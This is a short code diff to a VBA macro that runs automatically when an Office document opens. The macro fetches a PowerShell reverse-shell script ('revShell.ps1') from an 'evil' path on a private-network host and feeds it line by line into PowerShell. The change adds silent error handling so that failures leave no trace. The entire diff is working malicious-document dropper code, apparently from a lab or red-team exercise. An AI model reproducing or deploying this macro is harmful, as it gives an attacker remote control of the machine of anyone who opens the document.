@@ -5,6 +5,7 @@ sub document_open()
         url = "http://192.168.235.128/evil/revShell.ps1"
 	    
         ' Get revShell payload
+	on error goto fine
         Set http = CreateObject("MSXML2.XMLHTTP")
         http.Open "GET", url, False
         http.send
@@ -21,5 +22,7 @@ sub document_open()
 	
         ' send Payload to powershell one line at time
         command.StdIn.Write content & vbCrLf
-	command.StdIn.Close	
+	command.StdIn.Close
+	fine:
+	exit sub
 End Sub
